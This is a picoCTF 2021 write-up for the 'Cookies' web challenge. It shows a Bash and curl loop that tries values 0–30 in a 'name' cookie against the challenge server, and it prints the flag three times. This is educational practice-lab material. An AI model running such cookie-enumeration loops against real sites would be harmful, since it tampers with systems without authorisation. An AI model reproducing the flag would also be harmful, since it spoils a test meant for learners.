# Cookies
| **Platform** | picoCTF 2021 |
| **Category** | Web Exploitation |
| **Difficulty** | Easy |
| **Challenge** | Cookies |
| **Topic** | Cookie Manipulation |

## Challenge

The challenge provides a web application that uses cookies to determine which message or page is displayed.

The goal is to find the correct cookie value that reveals the flag.

## Step 1 – Launch the Instance

Start the challenge instance and connect to the provided URL.

The application uses a cookie named:

name

## Step 2 – Test Cookie Values

The challenge can be tested by changing the value of the `name` cookie.

A simple way to automate this is:

for i in $(seq 0 30); do
    echo -n "$i: "
    curl -s --cookie "name=$i" http://wily-courier.picoctf.net:57295/ | grep -o 'picoCTF{[^}]*}'
done

## Step 3 – Find the Correct Cookie

Testing the cookie values from 0 to 30 reveals the flag when the correct value is used.

The successful value was found during the automated request.

The server returned:

picoCTF{3v3ry1_10v3s_c00k135_a4dadb49}

## Step 4 – Verify the Flag

The flag can also be extracted directly using:

curl -s --cookie "name=<correct_value>" http://wily-courier.picoctf.net:57295/ | grep -o 'picoCTF{[^}]*}'

## Flag

picoCTF{3v3ry1_10v3s_c00k135_a4dadb49}

## Tools Used

- curl
- Bash
- Browser
- Cookies

## Key Learning

- Websites can store information in client-side cookies.
- Cookie values can sometimes control application behavior.
- Cookies can be modified manually or programmatically.
- Automating requests is useful when testing a range of possible cookie values.
- `curl --cookie` allows a custom cookie to be sent with an HTTP request.
- `grep` can extract the flag from the server response.

## Final Solution

Launch the challenge.

↓

Identify the `name` cookie.

↓

Test different cookie values.

↓

Automate the process with a Bash loop and `curl`.

↓

Search each response for `picoCTF{...}`.

↓

The correct cookie value reveals the flag.

## One-Line Solution

Brute-force the `name` cookie with `curl` and extract the response containing `picoCTF{...}`.

## Flag

picoCTF{3v3ry1_10v3s_c00k135_a4dadb49}
